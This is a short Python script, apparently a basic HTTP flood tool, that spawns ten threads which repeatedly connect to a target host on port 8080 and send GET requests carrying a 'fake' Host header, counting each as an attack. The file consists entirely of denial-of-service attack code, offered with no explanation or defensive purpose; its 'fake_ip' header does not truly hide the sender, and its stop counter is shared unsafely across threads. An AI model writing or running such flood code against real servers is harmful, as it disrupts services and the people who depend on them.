import socket
import threading

attack_num = 0
target_host = '127.0.0.1'
fake_ip = '182.21.20.32'
port = 8080

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_host, port))
        s.sendto(("GET /" + target_host + " HTTP/1.1\r\n").encode('ascii'), (target_host, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_host, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        if attack_num == 100:
            break
        s.close()

for i in range(10):
    thread = threading.Thread(target=attack)
    thread.start()

